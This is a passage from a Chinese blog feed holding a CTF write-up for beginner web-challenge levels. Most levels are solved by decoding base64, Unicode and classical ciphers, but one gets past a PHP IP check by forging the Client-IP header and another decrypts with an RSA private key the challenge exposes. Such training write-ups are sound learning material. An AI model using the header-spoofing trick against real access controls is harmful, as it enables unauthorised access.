撇脚英文<br>/ctf/lv7.php</p><p>无厘头的一题，直接问了别人答案</p><pre><code class=\"html\">http://ctf.gcowsec.com/ctf/lv7.php?answer=the password\n<span class=\"comment\">&lt;!--flag{haha}--&gt;</span></code></pre><hr><h1 id=\"Lv8-数学问题\"><a href=\"#Lv8-数学问题\" class=\"headerlink\" title=\"Lv8 数学问题\"></a>Lv8 数学问题</h1><blockquote><p><a href=\"http://ctf.gcowsec.com/index.php?index=8\" target=\"_blank\" rel=\"noopener\">http://ctf.gcowsec.com/index.php?index=8</a></p></blockquote><p>题目提示<br>Y has 12 X, X has 25 Z, and every 5 Z has one R. If 36Y plus 10 Z, how many R are there? 提交 /ctf/lv8.php?answer=答案 然后获取通过答案<br>/ctf/lv8.php</p><p>直接列方程解出来就好</p><hr><h1 id=\"Lv9-NO-Base64\"><a href=\"#Lv9-NO-Base64\" class=\"headerlink\" title=\"Lv9 NO Base64\"></a>Lv9 NO Base64</h1><blockquote><p><a href=\"http://ctf.gcowsec.com/index.php?index=9\" target=\"_blank\" rel=\"noopener\">http://ctf.gcowsec.com/index.php?index=9</a></p></blockquote><p>题目提示<br>看啥都是base64 该治疗下 电击疗法了<br>内容:ftlPb8D748qunH47zQJAEa92qiFas6I7SxAsRIYmaJIOWFU6Bz5KsT9H64UKwVnH/pLD4bFzJwfIYc1Foeqdpg==</p><p>题目给出的内容咋一看像RSA加密，右键查看源代码发现如下内容</p><pre><code class=\"html\"><span class=\"comment\">&lt;!-- 年纪青青眼睛瞎掉 啥都像base64--&gt;</span>\n<span class=\"comment\">&lt;!--JTIwJXU1RTc0JXU3RUFBJXU5NzUyJXU5NzUyJTIwJXU3NzNDJXU3NzVCJXU1QzMxJXU3NzhFJXU0RTg2JTIwJXU4RkQ5JXU0RTBEJXU2NjJGYmFzZTY0JTIwJXU4RkQ5JXU2NjJGci4uJTI4JXU1NTE0Li4lMjk=--&gt;</span>\n<span class=\"comment\">&lt;!--JXU1NzMwJXU1NzQwJXU2NjJGJTIwY3RmL3JzYS5waHAlMjByc2EldTdCOTcldTZDRDUlMjAldTYwNkQldTU1OUMldTRGNjAldTc5QkIldTgwREMldTUyMjkldTUzQzgldThGRDEldTRFODY= --&gt;</span>\n<span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>内容:ftlPb8D748qunH47zQJAEa92qiFas6I7SxAsRIYmaJIOWFU6Bz5KsT9H64UKwVnH/pLD4bFzJwfIYc1Foeqdpg==<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></code></pre><p>对注释中的两个base64进行解码再进行URL解码发现第二个注释内容为：地址是 ctf/rsa.php rsa算法 恭喜你离胜利又近了</p><p>访问 <code>view-source:http://ctf.gcowsec.com/ctf/rsa.php</code> 得到如下内容:</p><pre><code class=\"html\">-----BEGIN RSA PRIVATE KEY-----\nMIIBOgIBAAJBAIb2tnnyvn/WoZnHEmDaGKuzLXv/ys0QXyvSzHhDi9KaFKTzDrpk\nbeXGeexQKk220RRZoNkZAl5b6mkNmyJTotcCAwEAAQJAaEb+vkI7xfJDcdlJ7eMU\n5LTQE9qTCtX3cpiwussVoWWkCETWTdjKdcNyVfhHMTRGsUwZamczn8w/QJhJkfp6\nwQIhALry6dMHRKoNMFYVzrV1W/Y2jOpNT/bibqOybasCI1t5AiEAuNBOHoEy2pBC\nnpU7zafxvM6zCWLUw4la/VIZhstLDM8CIQCumltqffpSfJjtfdaewaqPLWm1F1oc\n8mR1PRuSQR/2uQIgeSKv0XbFqlScFe2jAS1vWV3yI9jPtEq3hQrnCF7/likCIGGV\n+1CnPSWYGTQSCJ7sNhBcp8KQlFTs+r5dqO7jpv/c\n-----END RSA PRIVATE KEY-----</code></pre><p>拿到私钥后拿去解密即可</p><pre><code class=\"py\"><span class=\"comment\">#https://www.bejson.com/enc/rsa/</span>\n<span class=\"comment\">#</span>\n<span class=\"comment\">#请输入私钥</span>\n-----BEGIN RSA PRIVATE KEY-----\nMIIBOgIBAAJBAIb2tnnyvn/WoZnHEmDaGKuzLXv/ys0QXyvSzHhDi9KaFKTzDrpk\nbeXGeexQKk220RRZoNkZAl5b6mkNmyJTotcCAwEAAQJAaEb+vkI7xfJDcdlJ7eMU\n<span class=\"number\">5L</span>TQE9qTCtX3cpiwussVoWWkCETWTdjKdcNyVfhHMTRGsUwZamczn8w/QJhJkfp6\nwQIhALry6dMHRKoNMFYVzrV1W/Y2jOpNT/bibqOybasCI1t5AiEAuNBOHoEy2pBC\nnpU7zafxvM6zCWLUw4la/VIZhstLDM8CIQCumltqffpSfJjtfdaewaqPLWm1F1oc\n<span class=\"number\">8</span>mR1PRuSQR/<span class=\"number\">2</span>uQIgeSKv0XbFqlScFe2jAS1vWV3yI9jPtEq3hQrnCF7/likCIGGV\n+<span class=\"number\">1</span>CnPSWYGTQSCJ7sNhBcp8KQlFTs+r5dqO7jpv/c\n-----END RSA PRIVATE KEY-----\n<span class=\"comment\">#请输入要解密的签名</span>\nftlPb8D748qunH47zQJAEa92qiFas6I7SxAsRIYmaJIOWFU6Bz5KsT9H64UKwVnH/pLD4bFzJwfIYc1Foeqdpg==\n<span class=\"comment\">#解密结果</span>\nflag{this <span class=\"keyword\">is</span> good game do you think}</code></pre><hr><h1 id=\"Lv10-搜索引擎2\"><a href=\"#Lv10-搜索引擎2\" class=\"headerlink\" title=\"Lv10 搜索引擎2\"></a>Lv10 搜索引擎2</h1><blockquote><p><a href=\"http://ctf.gcowsec.com/index.php?index=10\" target=\"_blank\" rel=\"noopener\">http://ctf.gcowsec.com/index.php?index=10</a></p></blockquote><p>题目提示<br>If there is a shadow in front of you,don‘t be fear,that because sunshine behind ___. 好了不坑了(嘤嘤嘤 别打咱) 提交格式:flag{答案}</p><p>按照出题者思路应该是百度这段话后面填啥，然后填进去，但是我潜意识中觉得是填you，还真对了</p><hr><h1 id=\"Lv11-让我进去\"><a href=\"#Lv11-让我进去\" class=\"headerlink\" title=\"Lv11 让我进去\"></a>Lv11 让我进去</h1><blockquote><p><a href=\"http://ctf.gcowsec.com/index.php?index=11\" target=\"_blank\" rel=\"noopener\">http://ctf.gcowsec.com/index.php?index=11</a></p></blockquote><p>题目提示</p><pre><code class=\"php\"><span class=\"comment\">//轻松点 (开始正式的了)</span>\n<span class=\"comment\">///ctf/2.php </span>\n<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">GetIP</span><span class=\"params\">()</span></span>{\n    <span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>($_SERVER[<span class=\"string\">\"HTTP_CLIENT_IP\"</span>]))\n        $cip = $_SERVER[<span class=\"string\">\"HTTP_CLIENT_IP\"</span>];\n    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>($_SERVER[<span class=\"string\">\"HTTP_X_FORWARDED_FOR\"</span>]))\n        $cip = $_SERVER[<span class=\"string\">\"HTTP_X_FORWARDED_FOR\"</span>];\n    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>($_SERVER[<span class=\"string\">\"REMOTE_ADDR\"</span>]))\n        $cip = $_SERVER[<span class=\"string\">\"REMOTE_ADDR\"</span>];\n    <span class=\"keyword\">else</span>\n        $cip = <span class=\"string\">\"0.0.0.0\"</span>;\n    <span class=\"keyword\">return</span> $cip;\n    }\n\n    $GetIPs = GetIP();\n    <span class=\"keyword\">if</span> ($GetIPs==<span class=\"string\">\"1.1.1.1\"</span>){\n    <span class=\"keyword\">echo</span> <span class=\"string\">\"flag{XXXX}\"</span>;\n    }\n    <span class=\"keyword\">else</span>{\n    <span class=\"keyword\">echo</span> <span class=\"string\">\"错误！你的IP不在访问列表之内！(1.1.1.1)\"</span>;\n    }    </code></pre><p>看起来是要伪造IP为1.1.1.1，直接用Client-Ip伪造就好，但是这里要注意的是不能使用burp，使用火狐自带的编辑重放就好，不然会响应超时，不知道为什么<br><code>flag{Fuck Game}</code></p><hr><h1 id=\"Lv12-No-js\"><a href=\"#Lv12-No-js\" class=\"headerlink\" title=\"Lv12 No js\"></a>Lv12 No js</h1><blockquote><p><a href=\"http://ctf.gcowsec.com/index.php?index=12\" target=\"_blank\" rel=\"noopener\">http://ctf.gcowsec.com/index.php?index=12</a></p></blockquote><p>题目提示<br>flag??没有的 别看了 f12也不管用<br>然后还是F12获取到了下面一串代码</p><pre><code class=\"html\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/javascript\"</span>&gt;</span>\n<span class=\"javascript\"><span class=\"built_in\">eval</span>(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">p,a,c,k,e,d</span>)</span>{e=<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">c</span>)</span>{<span class=\"keyword\">return</span>(c&lt;a?<span class=\"string\">\"\"</span>:e(<span class=\"built_in\">parseInt</span>(c/a)))+((c=c%a)&gt;<span class=\"number\">35</span>?<span class=\"built_in\">String</span>.fromCharCode(c+<span class=\"number\">29</span>):c.toString(<span class=\"number\">36</span>))};<span class=\"keyword\">if</span>(!<span class=\"string\">''</span>.replace(<span class=\"regexp\">/^/</span>,<span class=\"built_in\">String</span>)){<span class=\"keyword\">while</span>(c--)d[e(c)]=k[c]||e(c);k=[<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">e</span>)</span>{<span class=\"keyword\">return</span> d[e]}];e=<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>{<span class=\"keyword\">return</span><span class=\"string\">'\\\\w+'</span>};c=<span class=\"number\">1</span>;};<span class=\"keyword\">while</span>(c--)<span class=\"keyword\">if</span>(k[c])p=p.replace(<span class=\"keyword\">new</span> <span class=\"built_in\">RegExp</span>(<span class=\"string\">'\\\\b'</span>+e(c)+<span class=\"string\">'\\\\b'</span>,<span class=\"string\">'g'</span>),k[c]);<span class=\"keyword\">return</span> p;}(<span class=\"string\">'8 0(){1 0=\"\";1 3=\"0\";1 2=\"{\";1 4=\"}\";1 5=\"7 6 b a\";1 0=\"0\";0=3+2+5+4;9 0}'</span>,<span class=\"number\">12</span>,<span class=\"number\">12</span>,<span class=\"string\">'flag|var|flag1|flag0|flag2|flag3|no|js|function|return|good|is'</span>.split(<span class=\"string\">'|'</span>),<span class=\"number\">0</span>,{}))</span>\n<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></code></pre><p>可以比较轻松判断为JavaScript Eval Encode/Decode类型的题目</p><pre><code class=\"html\"><span class=\"comment\">&lt;!--http://www.oicqzone.com/tool/eval/ 在线解码可以轻易得到解码后的js代码，下面为解码后的结果--&gt;</span>\n<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>\n<span class=\"actionscript\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">flag</span><span class=\"params\">()</span> </span>{</span>\n<span class=\"actionscript\">    <span class=\"keyword\">var</span> flag = <span class=\"string\">\"\"</span>;</span>\n<span class=\"actionscript\">    <span class=\"keyword\">var</span> flag0 = <span class=\"string\">\"flag\"</span>;</span>\n<span class=\"actionscript\">    <span class=\"keyword\">var</span> flag1 = <span class=\"string\">\"{\"</span>;</span>\n<span class=\"actionscript\">    <span class=\"keyword\">var</span> flag2 = <span class=\"string\">\"}\"</span>;</span>\n<span class=\"actionscript\">    <span class=\"keyword\">var</span> flag3 = <span class=\"string\">\"js no is good\"</span>;</span>\n<span class=\"actionscript\">    <span class=\"keyword\">var</span> flag = <span class=\"string\">\"flag\"</span>;</span>\n    flag = flag0 + flag1 + flag3 + flag2;\n<span class=\"actionscript\">    <span class=\"keyword\">return</span> flag</span>\n}\n<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span>\n<span class=\"comment\">&lt;!--flag{js no is good}--&gt;</span></code></pre><hr><h1 id=\"Lv13-简单的标题\"><a href=\"#Lv13-简单的标题\" class=\"headerlink\" title=\"Lv13 简单的标题\"></a>Lv13 简单的标题</h1><blockquote><p><a href=\"http://ctf.gcowsec.com/index.php?index=13\" target=\"_blank\" rel=\"noopener\">http://ctf.gcowsec.com/index.php?index=13</a></p></blockquote><p>题目没有什么特别的提示，F12获得一串字符串</p><pre><code class=\"html\"><span class=\"comment\">&lt;!-- &lt;pre&gt;iVBORw0KGgoAAAANSUhEUgAAAJYAAAAcCAIAAAAMSNELAAAAAXNSR0IArs4c6QAAAARnQU1BAACx</span>\n<span class=\"comment\">jwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAAhdEVYdENyZWF0aW9uIFRpbWUAMjAxOTowNzoyMSAxMTo1OTo0NnMZAJkAAAeCSURBVGhD7ZoJU</span>\n<span class=\"comment\">FNXFEB/dkIUCMiOAtoFtO51wbrg7pSpVqxjW1vRulWLFRDBlUGtWldc6lKXui841elUK5a6VKtU3EfHqq1WCRCWECBA9q33//cak/B/SFq0k2nO</span>\n<span class=\"comment\">ZC7v3vdy/3/3vn/f+xlYj+saCA/uDBv/9eC2eFLo9nhS6PZ4Uuj2eFLo9nhS6PZ4Uuj22KfQqKiVzU+X9O9VPLgvqM+6xMAHdb04HF+lLOmDsknj</span>\n<span class=\"comment\">seIEro5/OXN8cdinUL50sTLvlH/GgrATp7CpOVBfLSgeNgArcJUvl5W8MwwrTWIykR/ncXX8y0Vz60b59ElFb3Uv6tmJNgiyRZnWqwriBtFDbVrsU6guu</span>\n<span class=\"comment\">AJSNCKB4+uHLM1C9bpVAQuysEIQ9UcPGYolWGmK0AO5ofuOYMUJXB3/MlH+dKZ88sccsTj825NtCm4Fb9mJO/5GeTbfUFpCcDhYJwiIG0QPK3TYp9CsVo</span>\n<span class=\"comment\">FkcblIbS70T/8U9n3+FP4/McrlVdkL+bEdWq1Yyw0NgyDz2kTiPgpDlax65VIogYTRiE0EAXEzFD3FCh02KbQ8vEzbAzzR5dMmop0S7sbU8Pz3VagP0g/fI4</span>\n<span class=\"comment\">tDwpCG0yftPRj0lmXBdBXdk8cVM6cWxXUjnS/LMqnVyG49zKzX1e7+ujQxoah3F5DKH08juzWujkfoS0sqM1JhajAF6Udj1YW/4g7mWTM5R6mSDOpDuno/UXX</span>\n<span class=\"comment\">xArLXH881K5W+SZ+w2PZPDkKetaDFqERBbAesU0DczDodVuiw8RV156GlYWlbU597WJyWGXHmvChhZMN3x2s2rkV2mH/FzCnGannI/tyQPYfqjxxEdlqYriLPXih</span>\n<span class=\"comment\">OmQPOBV26Nhw/VrttM+6wQjZ/bu3mnJZjxrW+WBi4bpPq5/O4gwHnx1fOniEa8TZcPWjLTmNZGUxHc+cW6mKaNa1zOA+WTRinunQhaMPWiLwLbB+fypSZmrt3oEt</span>\n<span class=\"comment\">95ReQXj17k19uRN2xIwZpqd+MZKw7Df1yYCIo5ytBTCzbW+SbNBlUy/pSfLPDrNGIk1OglxsU7J+xENkRsFoJLg8rzPh9Npv/WgzswX7JKaCqzuUjuzXqS+QVW4we</span>\n<span class=\"comment\">wxYI+NHtAlfiaDLh/HjfiVNEg4bC1IQ9eonnZEIpU+zYhrqYZk3rHFYebGbimbO9OnXhBASIZ6URZrNi+xbogt2EJfTW/f5IOu5dslyNGqHYv4d0BF2SopqcNQFLV</span>\n<span class=\"comment\">7B4fGSxgcsjY8iAaykER1BhFAf31mzdCKpRVons2ps3QFrWFz+2PWogVOfPCmwttAg6d0UNXkRrkIaKCqRaw4tuC7IqexEUK2RxjPPjhf0H4ha0e/UBqb1HPjoA06</span>\n<span class=\"comment\">xpncNkQQr7xyOV98qrIHV/PAJpUjYQRkPdgT1Bm7aHnz7HC29ds34VZNFsMskWpLdMHAtZp75kD0QPuaXFhRRCYSkeHl+1eJ6ppkYYR741wvqieghDuRQkxz8AqXa</span>\n<span class=\"comment\">nIVlmmu/kaVhhhi0UogZeiQY9pdkQuCqHH9NelZ9XkjBYvnq5Zb9kwtnxHA7Hxwe34QZatABpUmtAOpg1rXOjvApkybABaEuWxJHrEmWdxRfAruafPp8bHMJtFSieO</span>\n<span class=\"comment\">w+MsEEqdmwF536fp4FKC0QPYoiVRriQQjgsmaqrg7ftFs9KFfazOV6yRdScYZVRGOvqUAMRuGZD7d9F6V/Ci4oOO3oiaMMWblh4/eEDsrmzcQcDzo43mcwGA27D/V</span>\n<span class=\"comment\">eUg+QGB4N0MGta5+yW5FJofeka2uktHzByqerCCQ0DCaBiYyyT1u7cBrVX0qszyrrlLGZpQ/QghsjYGBdSqC96BpLXpg1I3aMHlA2DyoX29k2kam9dRw2E98Ahs</span>\n<span class=\"comment\">AFghYLFJ58z66i5hHf84JCd+6GhoQp4kzQ93mzW3Hx+z8r8PJDCAWRpdTBrhJ1zr67dyfaNQrKPwrKNeVPVVXf/HlL1zyjP0W2jbt5vnG/A0oboQQyRsTEupBDlq</span>\n<span class=\"comment\">eHU91D64dlHRoTvpKkgazat15cU654+UezegewIsq7aVkX+67Eg1ZcvwvkNWZwEzv3w7kFuTteugirsTW5aDnB+vHzFEqiZJpWyIe8Hxa7tnMAgv8mfgt3BrGmd</span>\n<span class=\"comment\">+06bAaeP6tUr1NcLTVqt9uGDiuTp1HDCZ8IkcFu96guIkqGyAhoEi+WXnIp6HWH1StYYF1LYaslKQcfOUFjKp0/0oc5mFuDuA7KWmlQqaWKCPHuR/7xFpJX5FBqw</span>\n<span class=\"comment\">eAm//RuyjFTpuNHY5ByiocNl8+ZI+vWs3bzeZ3xSq+WOfrYAnB8fMD8L4i7p3xsmCEs+9OAxOE+C3cGsaZ3DW13Irn1QJCtnTS+Oj4M3EHFKOhoPh+2QvYe5YRFw</span>\n<span class=\"comment\">Ii0dOdxsNEJ99rYtzv+AF/LvT7DEYD+HHSLi9DlkefZmx8irtx0sJQ9MwHYj6dMt8tpdrDfChafQMZaKD2iowmL9DsuLikJGD66iLizgRkZjhY5mS2HFjCnaB/fh</span>\n<span class=\"comment\">YK0uuAxvqSyRyHcKuZcg/NMyq7Jt3vc9OIl8yWL/1LlYoaPZCqnm7p2aNSu1D35je3t79ejpl5zCj26H+zy8SDz/Cuz2NFsh9fBf4Umhm0MQfwEltfvIq3kejAAA</span>\n<span class=\"comment\">AABJRU5ErkJggg==</span>\n<span class=\"comment\">&lt;/pre&gt; --&gt;</span></code></pre><p>注意到，这对字符串里面开头是<code>iVBORw0KGgoAAAANSUhEUgAAA</code>，不难判断为图片转base64后的特征，补全其他标签另存为html打开即可获得一张图片，图片内容即为flag</p><p><img src=\"data:image/png;base64,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\">F12选图片看看</p><pre><code class=\"html\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"data:image/png;base64,iVBORw0KGgoAAA...\"</span> /&gt;</span>\n<span class=\"comment\">&lt;!--flag{this is base64}--&gt;</span></code></pre><hr><h1 id=\"Lv14-Unicode\"><a href=\"#Lv14-Unicode\" class=\"headerlink\" title=\"Lv14 Unicode\"></a>Lv14 Unicode</h1><blockquote><p><a href=\"http://ctf.gcowsec.com/index.php?index=14\" target=\"_blank\" rel=\"noopener\">http://ctf.gcowsec.com/index.php?index=14</a></p></blockquote><p>题目提示<br><code>\\u0066\\u006c\\u0061\\u0067\\u007b\\u0041\\u0053\\u0043\\u0049\\u0049\\u005f\\u0054\\u0065\\u0073\\u0074\\u005f\\u0066\\u006f\\u0072\\u005f\\u0066\\u0075\\u006e\\u007d</code></p><p>直接Unicode解码成字符串即可</p><p><code>flag{ASCII_Test_for_fun}</code></p><hr><h1 id=\"Lv15-凯撒大佬\"><a href=\"#Lv15-凯撒大佬\" class=\"headerlink\" title=\"Lv15 凯撒大佬\"></a>Lv15 凯撒大佬</h1><blockquote><p><a href=\"http://ctf.gcowsec.com/index.php?index=15\" target=\"_blank\" rel=\"noopener\">http://ctf.gcowsec.com/index.php?index=15</a></p></blockquote><p>题目提示<br>这就是答案 iodj{sdvvzrug lv}</p><p>简单的凯撒密码，对照可知f-i平移三位<br><code>flag{password is}</code></p><hr><h1 id=\"Lv16-密码学\"><a href=\"#Lv16-密码学\" class=\"headerlink\" title=\"Lv16 密码学\"></a>Lv16 密码学</h1><blockquote><p><a href=\"http://ctf.gcowsec.com/index.php?index=16\" target=\"_blank\" rel=\"noopener\">http://ctf.gcowsec.com/index.php?index=16</a></p></blockquote><p>题目提示<br>上题都过了 别给我说你这题过不了 fa{o o r ih}lgwwyuaergt</p><p>简单的栅栏密码，每组字数二解密可获得flag</p><pre><code class=\"html\"><span class=\"comment\">&lt;!--https://www.qqxiuzi.cn/bianma/zhalanmima.php--&gt;</span>\nfa{o o r ih}lgwwyuaergt\n<span class=\"comment\">&lt;!--每组字数2 解密--&gt;</span>\nflag{wow you are right}</code></pre><hr><h1 id=\"Lv17-图片\"><a href=\"#Lv17-图片\" class=\"headerlink\" title=\"Lv17 图片\"></a>Lv17 图片</h1><blockquote><p><a href=\"http://ctf.gcowsec.com/index.php?index=17\" target=\"_blank\" rel=\"noopener\">http://ctf.gcowsec.com/index.php?index=17</a></p></blockquote><p>题目提示<br>这是一张图片 但是我们考虑到您下载图片的麻烦所以我们将图片改后辍为xxx以便下载 /ctf/sos.xxx</p><p>访问路径后得到图片，下载到本地后使用binwalk分析</p><pre><code class=\"shell\">llmf@DESKTOP-CUGCI8H:/mnt/f/文档资料/CTF/HackGame$ binwalk sos.xxx.jpg\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             JPEG image data, JFIF standard 1.01\n7589          0x1DA5          Zip archive data, at least v2.0 to extract, compressed size: 21, uncompressed size: 18, name: eng.key\n7647          0x1DDF          Zip archive data, at least v2.0 to extract, compressed size: 16569, uncompressed size: 16683, name: eng.png\n24431         0x5F6F          End of Zip archive, footer length: 22</code></pre><!-- rebuild by neat -->","excerpt":"","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://ll-mf.github.io/tags/CTF/"}]},{"title":"markdown小tips","date":"2020-08-06T08:55:17.000Z","path":"2020-08-06-markdown小tips.html","content":"<!-- build time:Fri May 14 2021 10:58:02 GMT+0800 (GMT+08:00) --><p>没有简介，没有</p><a id=\"more\"></a><p>Markdown给图片添加题注,并且可以调整大小</p><pre><code class=\"html\">half属性用于两张图片并排显示\n<span class=\"tag\">&lt;<span class=\"name\">center</span> <span class=\"attr\">class</span>=<span class=\"string\">\"half\"</span>&gt;</span>\n    <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">style</span>=<span class=\"string\">\"border-radius: 0.3125em;</span></span>\n<span class=\"tag\"><span class=\"string\">    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);\"</span> </span>\n<span class=\"tag\">    <span class=\"attr\">src</span>=<span class=\"string\">\"../img/fac.jpeg\"</span> <span class=\"attr\">width</span> = <span class=\"string\">\"50%\"</span> <span class=\"attr\">alt</span>=<span class=\"string\">\"\"</span>/&gt;</span><span class=\"comment\">&lt;!--width用于调整图片大小--&gt;</span>\n    <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">style</span>=<span class=\"string\">\"border-radius: 0.3125em;</span></span>\n<span class=\"tag\"><span class=\"string\">    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);\"</span> </span>\n<span class=\"tag\">    <span class=\"attr\">src</span>=<span class=\"string\">\"../img/fac2.jpeg\"</span> <span class=\"attr\">width</span> = <span class=\"string\">\"50%\"</span> <span class=\"attr\">alt</span>=<span class=\"string\">\"\"</span>/&gt;</span>\n    <span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span>\n    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"color:orange; border-bottom: 1px solid #d9d9d9;</span></span>\n<span class=\"tag\"><span class=\"string\">    display: inline-block;</span></span>\n<span class=\"tag\"><span class=\"string\">    color: #999;</span></span>\n<span class=\"tag\"><span class=\"string\">    padding: 2px;\"</span>&gt;</span>\n\n      <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span>\n<span class=\"tag\">&lt;/<span class=\"name\">center</span>&gt;</span>  </code></pre><!-- rebuild by neat -->","excerpt":"没有简介，没有","categories":[],"tags":[]},{"title":"2020天翼杯CTF","date":"2020-08-06T06:17:34.000Z","path":"2020-08-06-2020天翼杯.html","content":"<!-- build time:Fri May 14 2021 10:58:02 GMT+0800 (GMT+08:00) --><p><img src=\"../img/hexo-2020-08-06-14-22-13.png\" alt></p><a id=\"more\"></a><br><div align=\"right\"><div 